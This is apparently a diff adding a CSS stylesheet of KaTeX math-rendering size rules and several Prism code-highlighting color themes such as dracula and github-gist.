+      .katex .sizing.reset-size6.size11 {
+        font-size: 2.488em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size1,
+      .katex .sizing.reset-size7.size1 {
+        font-size: 0.41666667em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size2,
+      .katex .sizing.reset-size7.size2 {
+        font-size: 0.5em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size3,
+      .katex .sizing.reset-size7.size3 {
+        font-size: 0.58333333em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size4,
+      .katex .sizing.reset-size7.size4 {
+        font-size: 0.66666667em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size5,
+      .katex .sizing.reset-size7.size5 {
+        font-size: 0.75em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size6,
+      .katex .sizing.reset-size7.size6 {
+        font-size: 0.83333333em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size7,
+      .katex .sizing.reset-size7.size7 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size8,
+      .katex .sizing.reset-size7.size8 {
+        font-size: 1.2em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size9,
+      .katex .sizing.reset-size7.size9 {
+        font-size: 1.44em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size10,
+      .katex .sizing.reset-size7.size10 {
+        font-size: 1.72833333em;
+      }
+      .katex .fontsize-ensurer.reset-size7.size11,
+      .katex .sizing.reset-size7.size11 {
+        font-size: 2.07333333em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size1,
+      .katex .sizing.reset-size8.size1 {
+        font-size: 0.34722222em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size2,
+      .katex .sizing.reset-size8.size2 {
+        font-size: 0.41666667em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size3,
+      .katex .sizing.reset-size8.size3 {
+        font-size: 0.48611111em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size4,
+      .katex .sizing.reset-size8.size4 {
+        font-size: 0.55555556em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size5,
+      .katex .sizing.reset-size8.size5 {
+        font-size: 0.625em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size6,
+      .katex .sizing.reset-size8.size6 {
+        font-size: 0.69444444em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size7,
+      .katex .sizing.reset-size8.size7 {
+        font-size: 0.83333333em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size8,
+      .katex .sizing.reset-size8.size8 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size9,
+      .katex .sizing.reset-size8.size9 {
+        font-size: 1.2em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size10,
+      .katex .sizing.reset-size8.size10 {
+        font-size: 1.44027778em;
+      }
+      .katex .fontsize-ensurer.reset-size8.size11,
+      .katex .sizing.reset-size8.size11 {
+        font-size: 1.72777778em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size1,
+      .katex .sizing.reset-size9.size1 {
+        font-size: 0.28935185em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size2,
+      .katex .sizing.reset-size9.size2 {
+        font-size: 0.34722222em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size3,
+      .katex .sizing.reset-size9.size3 {
+        font-size: 0.40509259em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size4,
+      .katex .sizing.reset-size9.size4 {
+        font-size: 0.46296296em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size5,
+      .katex .sizing.reset-size9.size5 {
+        font-size: 0.52083333em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size6,
+      .katex .sizing.reset-size9.size6 {
+        font-size: 0.5787037em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size7,
+      .katex .sizing.reset-size9.size7 {
+        font-size: 0.69444444em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size8,
+      .katex .sizing.reset-size9.size8 {
+        font-size: 0.83333333em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size9,
+      .katex .sizing.reset-size9.size9 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size10,
+      .katex .sizing.reset-size9.size10 {
+        font-size: 1.20023148em;
+      }
+      .katex .fontsize-ensurer.reset-size9.size11,
+      .katex .sizing.reset-size9.size11 {
+        font-size: 1.43981481em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size1,
+      .katex .sizing.reset-size10.size1 {
+        font-size: 0.24108004em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size2,
+      .katex .sizing.reset-size10.size2 {
+        font-size: 0.28929605em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size3,
+      .katex .sizing.reset-size10.size3 {
+        font-size: 0.33751205em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size4,
+      .katex .sizing.reset-size10.size4 {
+        font-size: 0.38572806em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size5,
+      .katex .sizing.reset-size10.size5 {
+        font-size: 0.43394407em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size6,
+      .katex .sizing.reset-size10.size6 {
+        font-size: 0.48216008em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size7,
+      .katex .sizing.reset-size10.size7 {
+        font-size: 0.57859209em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size8,
+      .katex .sizing.reset-size10.size8 {
+        font-size: 0.69431051em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size9,
+      .katex .sizing.reset-size10.size9 {
+        font-size: 0.83317261em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size10,
+      .katex .sizing.reset-size10.size10 {
+        font-size: 1em;
+      }
+      .katex .fontsize-ensurer.reset-size10.size11,
+      .katex .sizing.reset-size10.size11 {
+        font-size: 1.19961427em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size1,
+      .katex .sizing.reset-size11.size1 {
+        font-size: 0.20096463em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size2,
+      .katex .sizing.reset-size11.size2 {
+        font-size: 0.24115756em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size3,
+      .katex .sizing.reset-size11.size3 {
+        font-size: 0.28135048em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size4,
+      .katex .sizing.reset-size11.size4 {
+        font-size: 0.32154341em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size5,
+      .katex .sizing.reset-size11.size5 {
+        font-size: 0.36173633em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size6,
+      .katex .sizing.reset-size11.size6 {
+        font-size: 0.40192926em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size7,
+      .katex .sizing.reset-size11.size7 {
+        font-size: 0.48231511em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size8,
+      .katex .sizing.reset-size11.size8 {
+        font-size: 0.57877814em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size9,
+      .katex .sizing.reset-size11.size9 {
+        font-size: 0.69453376em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size10,
+      .katex .sizing.reset-size11.size10 {
+        font-size: 0.83360129em;
+      }
+      .katex .fontsize-ensurer.reset-size11.size11,
+      .katex .sizing.reset-size11.size11 {
+        font-size: 1em;
+      }
+      .katex .delimsizing.size1 {
+        font-family: KaTeX_Size1;
+      }
+      .katex .delimsizing.size2 {
+        font-family: KaTeX_Size2;
+      }
+      .katex .delimsizing.size3 {
+        font-family: KaTeX_Size3;
+      }
+      .katex .delimsizing.size4 {
+        font-family: KaTeX_Size4;
+      }
+      .katex .delimsizing.mult .delim-size1 > span {
+        font-family: KaTeX_Size1;
+      }
+      .katex .delimsizing.mult .delim-size4 > span {
+        font-family: KaTeX_Size4;
+      }
+      .katex .nulldelimiter {
+        width: 0.12em;
+      }
+      .katex .op-symbol.small-op {
+        font-family: KaTeX_Size1;
+      }
+      .katex .op-symbol.large-op {
+        font-family: KaTeX_Size2;
+      }
+      .katex .accent .accent-body:not(.accent-full) {
+        width: 0;
+      }
+      .katex .overlay {
+        display: block;
+      }
+      .katex .mtable .vertical-separator {
+        display: inline-block;
+        min-width: 1px;
+      }
+      .katex .mtable .arraycolsep {
+        display: inline-block;
+      }
+      .katex .mtable .col-align-l > .vlist-t {
+        text-align: left;
+      }
+      .katex .mtable .col-align-r > .vlist-t {
+        text-align: right;
+      }
+      .katex .svg-align {
+        text-align: left;
+      }
+      .katex svg {
+        display: block;
+        position: absolute;
+        width: 100%;
+        height: inherit;
+        fill: currentColor;
+        stroke: currentColor;
+        fill-rule: nonzero;
+        fill-opacity: 1;
+        stroke-width: 1;
+        stroke-linecap: butt;
+        stroke-linejoin: miter;
+        stroke-miterlimit: 4;
+        stroke-dasharray: none;
+        stroke-dashoffset: 0;
+        stroke-opacity: 1;
+      }
+      .katex svg path {
+        stroke: none;
+      }
+      .katex img {
+        border-style: none;
+        min-width: 0;
+        min-height: 0;
+        max-width: none;
+        max-height: none;
+      }
+      .katex .stretchy {
+        width: 100%;
+        display: block;
+        position: relative;
+        overflow: hidden;
+      }
+      .katex .stretchy:after,
+      .katex .stretchy:before {
+        content: "";
+      }
+      .katex .hide-tail {
+        width: 100%;
+        position: relative;
+        overflow: hidden;
+      }
+      .katex .brace-center,
+      .katex .brace-left,
+      .katex .brace-right,
+      .katex .halfarrow-left,
+      .katex .halfarrow-right {
+        position: absolute;
+        overflow: hidden;
+      }
+      .katex .halfarrow-left {
+        left: 0;
+        width: 50.2%;
+      }
+      .katex .halfarrow-right {
+        right: 0;
+        width: 50.2%;
+      }
+      .katex .brace-left {
+        left: 0;
+        width: 25.1%;
+      }
+      .katex .brace-center {
+        left: 25%;
+        width: 50%;
+      }
+      .katex .brace-right {
+        right: 0;
+        width: 25.1%;
+      }
+      .mermaid,
+      textarea {
+        overflow: auto;
+      }
+      .katex .x-arrow-pad {
+        padding: 0 0.5em;
+      }
+      .katex .cd-arrow-pad {
+        padding: 0 0.55556em 0 0.27778em;
+      }
+      .katex .mover,
+      .katex .munder,
+      .katex .x-arrow {
+        text-align: center;
+      }
+      .katex .boxpad {
+        padding: 0 0.3em;
+      }
+      .katex .fbox,
+      .katex .fcolorbox {
+        box-sizing: border-box;
+        border: 0.04em solid;
+      }
+      .katex .cancel-pad {
+        padding: 0 0.2em;
+      }
+      .katex .cancel-lap {
+        margin-left: -0.2em;
+        margin-right: -0.2em;
+      }
+      .katex .sout {
+        border-bottom-style: solid;
+        border-bottom-width: 0.08em;
+      }
+      .katex .angl {
+        box-sizing: border-box;
+        border-top: 0.049em solid;
+        border-right: 0.049em solid;
+        margin-right: 0.03889em;
+      }
+      .katex .anglpad {
+        padding: 0 0.03889em;
+      }
+      .katex .eqn-num:before {
+        counter-increment: a;
+        content: "(" counter(a) ")";
+      }
+      .katex .mml-eqn-num:before {
+        counter-increment: b;
+        content: "(" counter(b) ")";
+      }
+      .katex .mtr-glue {
+        width: 50%;
+      }
+      .katex .cd-vert-arrow {
+        display: inline-block;
+        position: relative;
+      }
+      .katex .cd-label-left {
+        display: inline-block;
+        position: absolute;
+        right: calc(50% + 0.3em);
+        text-align: left;
+      }
+      .katex .cd-label-right {
+        display: inline-block;
+        position: absolute;
+        left: calc(50% + 0.3em);
+        text-align: right;
+      }
+      .katex-display {
+        display: block;
+        margin: 1em 0;
+        text-align: center;
+      }
+      .katex-display > .katex {
+        display: block;
+        text-align: center;
+        white-space: nowrap;
+      }
+      .katex-display > .katex > .katex-html {
+        display: block;
+        position: relative;
+      }
+      .katex-display > .katex > .katex-html > .tag {
+        position: absolute;
+        right: 0;
+      }
+      .katex-display.leqno > .katex > .katex-html > .tag {
+        left: 0;
+        right: auto;
+      }
+      .katex-display.fleqn > .katex {
+        text-align: left;
+        padding-left: 2em;
+      }
+      body {
+        counter-reset: a b;
+        margin: 0;
+      }
+      span.katex,
+      span.katex * {
+        font-family:
+          KaTeX_Main,
+          Times New Roman,
+          serif;
+      }
+      .token.pre.gfm * {
+        font-weight: inherit !important;
+        font-family:
+          Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif;
+      }
+      .token.pre.gfm .token.cdata,
+      .token.pre.gfm .token.comment,
+      .token.pre.gfm .token.doctype,
+      .token.pre.gfm .token.prolog {
+        color: #708090;
+      }
+      .token.pre.gfm .token.punctuation {
+        color: #999;
+      }
+      .token.pre.gfm .token.boolean,
+      .token.pre.gfm .token.constant,
+      .token.pre.gfm .token.deleted,
+      .token.pre.gfm .token.number,
+      .token.pre.gfm .token.property,
+      .token.pre.gfm .token.symbol,
+      .token.pre.gfm .token.tag {
+        color: #905;
+      }
+      .token.pre.gfm .token.attr-name,
+      .token.pre.gfm .token.builtin,
+      .token.pre.gfm .token.char,
+      .token.pre.gfm .token.inserted,
+      .token.pre.gfm .token.selector,
+      .token.pre.gfm .token.string {
+        color: #690;
+      }
+      .token.pre.gfm .language-css .token.string,
+      .token.pre.gfm .style .token.string,
+      .token.pre.gfm .token.entity,
+      .token.pre.gfm .token.operator,
+      .token.pre.gfm .token.url {
+        color: #a67f59;
+      }
+      .token.pre.gfm .token.atrule,
+      .token.pre.gfm .token.attr-value,
+      .token.pre.gfm .token.keyword {
+        color: #07a;
+      }
+      .token.pre.gfm .token.function {
+        color: #dd4a68;
+      }
+      .token.pre.gfm .token.important,
+      .token.pre.gfm .token.regex,
+      .token.pre.gfm .token.variable {
+        color: #e90;
+      }
+      .token.pre.gfm .token.bold,
+      .token.pre.gfm .token.important {
+        font-weight: 500;
+      }
+      .token.pre.gfm .token.italic {
+        font-style: italic;
+      }
+      .prism-atom-one-light .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-atom-one-light .prism .token.cdata,
+      .prism-atom-one-light .prism .token.comment,
+      .prism-atom-one-light .prism .token.prolog {
+        color: #708090;
+      }
+      .prism-atom-one-light .prism .token.doctype {
+        color: #4078f2;
+      }
+      .prism-atom-one-light .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-atom-one-light .prism .token.punctuation {
+        color: #999;
+      }
+      .prism-atom-one-light .prism .token.constant,
+      .prism-atom-one-light .prism .token.deleted,
+      .prism-atom-one-light .prism .token.number,
+      .prism-atom-one-light .prism .token.property,
+      .prism-atom-one-light .prism .token.regex,
+      .prism-atom-one-light .prism .token.symbol {
+        color: #986801;
+      }
+      .prism-atom-one-light .prism .token.boolean {
+        color: #0184bb;
+      }
+      .prism-atom-one-light .prism .token.tag {
+        color: #e45649;
+      }
+      .prism-atom-one-light .prism .token.attr-value,
+      .prism-atom-one-light .prism .token.builtin,
+      .prism-atom-one-light .prism .token.char,
+      .prism-atom-one-light .prism .token.inserted,
+      .prism-atom-one-light .prism .token.selector,
+      .prism-atom-one-light .prism .token.string {
+        color: #50a14f;
+      }
+      .prism-atom-one-light .prism .token.attr-name {
+        color: #986801;
+      }
+      .prism-atom-one-light .prism .language-css .token.string,
+      .prism-atom-one-light .prism .style .token.string,
+      .prism-atom-one-light .prism .token.entity,
+      .prism-atom-one-light .prism .token.operator,
+      .prism-atom-one-light .prism .token.url {
+        color: #a67f59;
+      }
+      .prism-atom-one-light .prism .token.atrule,
+      .prism-atom-one-light .prism .token.keyword {
+        color: #07a;
+      }
+      .prism-atom-one-light .prism .token.function {
+        color: #dd4a68;
+      }
+      .prism-atom-one-light .prism .token.important,
+      .prism-atom-one-light .prism .token.variable {
+        color: #e90;
+      }
+      .prism-atom-one-light .prism .token.bold,
+      .prism-atom-one-light .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-atom-one-light .prism .token.italic {
+        font-style: italic;
+      }
+      .prism-atom-one-dark .prism {
+        color: #abb2bf;
+        background: #282c34;
+      }
+      .prism-atom-one-dark .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-atom-one-dark .prism .token.cdata,
+      .prism-atom-one-dark .prism .token.comment,
+      .prism-atom-one-dark .prism .token.prolog {
+        color: #5c6370;
+      }
+      .prism-atom-one-dark .prism .token.doctype {
+        color: #61aeee;
+      }
+      .prism-atom-one-dark .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-atom-one-dark .prism .token.punctuation {
+        color: #999;
+      }
+      .prism-atom-one-dark .prism .token.constant,
+      .prism-atom-one-dark .prism .token.deleted,
+      .prism-atom-one-dark .prism .token.number,
+      .prism-atom-one-dark .prism .token.property,
+      .prism-atom-one-dark .prism .token.regex,
+      .prism-atom-one-dark .prism .token.symbol {
+        color: #98c379;
+      }
+      .prism-atom-one-dark .prism .token.boolean {
+        color: #56b6c2;
+      }
+      .prism-atom-one-dark .prism .token.tag {
+        color: #e06c75;
+      }
+      .prism-atom-one-dark .prism .token.attr-value,
+      .prism-atom-one-dark .prism .token.builtin,
+      .prism-atom-one-dark .prism .token.char,
+      .prism-atom-one-dark .prism .token.inserted,
+      .prism-atom-one-dark .prism .token.selector,
+      .prism-atom-one-dark .prism .token.string {
+        color: #690;
+      }
+      .prism-atom-one-dark .prism .token.attr-name {
+        color: #d19a66;
+      }
+      .prism-atom-one-dark .prism .language-css .token.string,
+      .prism-atom-one-dark .prism .style .token.string,
+      .prism-atom-one-dark .prism .token.entity,
+      .prism-atom-one-dark .prism .token.operator,
+      .prism-atom-one-dark .prism .token.url {
+        color: #690;
+      }
+      .prism-atom-one-dark .prism .token.atrule,
+      .prism-atom-one-dark .prism .token.keyword {
+        color: #c678dd;
+      }
+      .prism-atom-one-dark .prism .token.function {
+        color: #61aeee;
+      }
+      .prism-atom-one-dark .prism .token.important,
+      .prism-atom-one-dark .prism .token.variable {
+        color: #e90;
+      }
+      .prism-atom-one-dark .prism .token.bold,
+      .prism-atom-one-dark .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-atom-one-dark .prism .token.italic {
+        font-style: italic;
+      }
+      .prism-atom-one-dark .prism .tocken.class-name {
+        color: #e6c07b;
+      }
+      .prism-tomorrow-night .prism {
+        background: #1d1f21;
+        color: #c5c8c6;
+      }
+      .prism-tomorrow-night .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-tomorrow-night .prism .token.cdata,
+      .prism-tomorrow-night .prism .token.comment,
+      .prism-tomorrow-night .prism .token.prolog {
+        color: #969896;
+      }
+      .prism-tomorrow-night .prism .token.doctype {
+        color: #de935f;
+      }
+      .prism-tomorrow-night .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-tomorrow-night .prism .token.punctuation {
+        color: #999;
+      }
+      .prism-tomorrow-night .prism .token.constant,
+      .prism-tomorrow-night .prism .token.deleted,
+      .prism-tomorrow-night .prism .token.number,
+      .prism-tomorrow-night .prism .token.property,
+      .prism-tomorrow-night .prism .token.regex,
+      .prism-tomorrow-night .prism .token.symbol {
+        color: #b5bd68;
+      }
+      .prism-tomorrow-night .prism .token.boolean {
+        color: #de935f;
+      }
+      .prism-tomorrow-night .prism .token.tag {
+        color: #c66;
+      }
+      .prism-tomorrow-night .prism .token.attr-value,
+      .prism-tomorrow-night .prism .token.builtin,
+      .prism-tomorrow-night .prism .token.char,
+      .prism-tomorrow-night .prism .token.inserted,
+      .prism-tomorrow-night .prism .token.selector,
+      .prism-tomorrow-night .prism .token.string {
+        color: #b5bd68;
+      }
+      .prism-tomorrow-night .prism .token.attr-name {
+        color: #c66;
+      }
+      .prism-tomorrow-night .prism .language-css .token.string,
+      .prism-tomorrow-night .prism .style .token.string,
+      .prism-tomorrow-night .prism .token.entity,
+      .prism-tomorrow-night .prism .token.operator,
+      .prism-tomorrow-night .prism .token.url {
+        color: #a67f59;
+      }
+      .prism-tomorrow-night .prism .token.atrule,
+      .prism-tomorrow-night .prism .token.keyword {
+        color: #b294bb;
+      }
+      .prism-tomorrow-night .prism .token.function {
+        color: #81a2be;
+      }
+      .prism-tomorrow-night .prism .token.important,
+      .prism-tomorrow-night .prism .token.variable {
+        color: #c66;
+      }
+      .prism-tomorrow-night .prism .token.bold,
+      .prism-tomorrow-night .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-tomorrow-night .prism .token.italic {
+        font-style: italic;
+      }
+      .prism-dracula .prism {
+        color: #f8f8f2;
+        background: #282a36;
+      }
+      .prism-dracula .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-dracula .prism .token.cdata,
+      .prism-dracula .prism .token.comment,
+      .prism-dracula .prism .token.prolog {
+        color: #6272a4;
+      }
+      .prism-dracula .prism .token.doctype {
+        color: #f1fa8c;
+      }
+      .prism-dracula .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-dracula .prism .token.punctuation {
+        color: #999;
+      }
+      .prism-dracula .prism .token.constant,
+      .prism-dracula .prism .token.deleted,
+      .prism-dracula .prism .token.number,
+      .prism-dracula .prism .token.property,
+      .prism-dracula .prism .token.regex,
+      .prism-dracula .prism .token.symbol {
+        color: #f1fa8c;
+      }
+      .prism-dracula .prism .token.boolean {
+        color: #8be9fd;
+      }
+      .prism-dracula .prism .token.attr-value,
+      .prism-dracula .prism .token.builtin,
+      .prism-dracula .prism .token.char,
+      .prism-dracula .prism .token.inserted,
+      .prism-dracula .prism .token.selector,
+      .prism-dracula .prism .token.string,
+      .prism-dracula .prism .token.tag {
+        color: #f1fa8c;
+      }
+      .prism-dracula .prism .token.attr-name {
+        color: #8be9fd;
+      }
+      .prism-dracula .prism .language-css .token.string,
+      .prism-dracula .prism .style .token.string,
+      .prism-dracula .prism .token.entity,
+      .prism-dracula .prism .token.url {
+        color: #f1fa8c;
+      }
+      .prism-dracula .prism .token.operator {
+        color: #6272a4;
+      }
+      .prism-dracula .prism .token.atrule,
+      .prism-dracula .prism .token.keyword {
+        color: #ff79c6;
+      }
+      .prism-dracula .prism .token.function {
+        color: #8be9fd;
+      }
+      .prism-dracula .prism .token.important,
+      .prism-dracula .prism .token.variable {
+        color: #e90;
+      }
+      .prism-dracula .prism .token.bold,
+      .prism-dracula .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-dracula .prism .token.italic {
+        font-style: italic;
+      }
+      .prism-dracula .prism .tocken.class-name {
+        color: #e6c07b;
+      }
+      .prism-atelier-sulphurpool-light .prism {
+        color: #5e6687;
+        background: #f5f7ff;
+      }
+      .prism-atelier-sulphurpool-light .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.cdata,
+      .prism-atelier-sulphurpool-light .prism .token.comment,
+      .prism-atelier-sulphurpool-light .prism .token.prolog {
+        color: #6b7394;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.doctype {
+        color: #3d8fd1;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.punctuation {
+        color: #999;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.constant,
+      .prism-atelier-sulphurpool-light .prism .token.deleted,
+      .prism-atelier-sulphurpool-light .prism .token.number,
+      .prism-atelier-sulphurpool-light .prism .token.property,
+      .prism-atelier-sulphurpool-light .prism .token.regex,
+      .prism-atelier-sulphurpool-light .prism .token.symbol {
+        color: #ac9739;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.boolean {
+        color: #c76b29;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.tag {
+        color: #c94922;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.attr-value,
+      .prism-atelier-sulphurpool-light .prism .token.builtin,
+      .prism-atelier-sulphurpool-light .prism .token.char,
+      .prism-atelier-sulphurpool-light .prism .token.inserted,
+      .prism-atelier-sulphurpool-light .prism .token.selector,
+      .prism-atelier-sulphurpool-light .prism .token.string {
+        color: #ac9739;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.attr-name {
+        color: #c94922;
+      }
+      .prism-atelier-sulphurpool-light .prism .language-css .token.string,
+      .prism-atelier-sulphurpool-light .prism .style .token.string,
+      .prism-atelier-sulphurpool-light .prism .token.entity,
+      .prism-atelier-sulphurpool-light .prism .token.operator,
+      .prism-atelier-sulphurpool-light .prism .token.url {
+        color: #ac9739;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.atrule,
+      .prism-atelier-sulphurpool-light .prism .token.keyword {
+        color: #6679cc;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.function {
+        color: #3d8fd1;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.important,
+      .prism-atelier-sulphurpool-light .prism .token.variable {
+        color: #e90;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.bold,
+      .prism-atelier-sulphurpool-light .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-atelier-sulphurpool-light .prism .token.italic {
+        font-style: italic;
+      }
+      .prism-atelier-sulphurpool-light .prism .tocken.class-name {
+        color: #e6c07b;
+      }
+      .prism-github-gist .prism {
+        color: #5e6687;
+        background: #fff;
+      }
+      .prism-github-gist .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-github-gist .prism .token.cdata,
+      .prism-github-gist .prism .token.comment,
+      .prism-github-gist .prism .token.prolog {
+        color: #969896;
+      }
+      .prism-github-gist .prism .token.doctype {
+        color: #795da3;
+      }
+      .prism-github-gist .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-github-gist .prism .token.punctuation {
+        color: #969896;
+      }
+      .prism-github-gist .prism .token.constant,
+      .prism-github-gist .prism .token.deleted,
+      .prism-github-gist .prism .token.property,
+      .prism-github-gist .prism .token.regex,
+      .prism-github-gist .prism .token.symbol {
+        color: #0086b3;
+      }
+      .prism-github-gist .prism .token.number {
+        color: #c76b29;
+      }
+      .prism-github-gist .prism .token.boolean {
+        color: #0086b3;
+      }
+      .prism-github-gist .prism .token.tag {
+        color: #63a35c;
+      }
+      .prism-github-gist .prism .token.attr-value,
+      .prism-github-gist .prism .token.builtin,
+      .prism-github-gist .prism .token.char,
+      .prism-github-gist .prism .token.inserted,
+      .prism-github-gist .prism .token.selector,
+      .prism-github-gist .prism .token.string {
+        color: #df5000;
+      }
+      .prism-github-gist .prism .token.attr-name {
+        color: #795da3;
+      }
+      .prism-github-gist .prism .language-css .token.string,
+      .prism-github-gist .prism .style .token.string,
+      .prism-github-gist .prism .token.entity,
+      .prism-github-gist .prism .token.operator,
+      .prism-github-gist .prism .token.url {
+        color: #df5000;
+      }
+      .prism-github-gist .prism .token.atrule,
+      .prism-github-gist .prism .token.keyword {
+        color: #a71d5d;
+      }
+      .prism-github-gist .prism .token.function {
+        color: #795da3;
+      }
+      .prism-github-gist .prism .token.important,
+      .prism-github-gist .prism .token.variable {
+        color: #df5000;
+      }
+      .prism-github-gist .prism .token.bold,
+      .prism-github-gist .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-github-gist .prism .token.italic {
+        font-style: italic;
+      }
+      .prism-github-gist .prism .tocken.class-name {
+        color: #e6c07b;
+      }
+      .prism-kimbie-light .prism {
+        color: #84613d;
+        background: #fbebd4;
+      }
+      .prism-kimbie-light .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-kimbie-light .prism .token.cdata,
+      .prism-kimbie-light .prism .token.comment,
+      .prism-kimbie-light .prism .token.prolog {
+        color: #a57a4c;
+      }
+      .prism-kimbie-light .prism .token.doctype {
+        color: #f06431;
+      }
+      .prism-kimbie-light .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-kimbie-light .prism .token.punctuation {
+        color: #999;
+      }
+      .prism-kimbie-light .prism .token.constant,
+      .prism-kimbie-light .prism .token.deleted,
+      .prism-kimbie-light .prism .token.number,
+      .prism-kimbie-light .prism .token.property,
+      .prism-kimbie-light .prism .token.regex,
+      .prism-kimbie-light .prism .token.symbol {
+        color: #889b4a;
+      }
+      .prism-kimbie-light .prism .token.boolean {
+        color: #f79a32;
+      }
+      .prism-kimbie-light .prism .token.tag {
+        color: #dc3958;
+      }
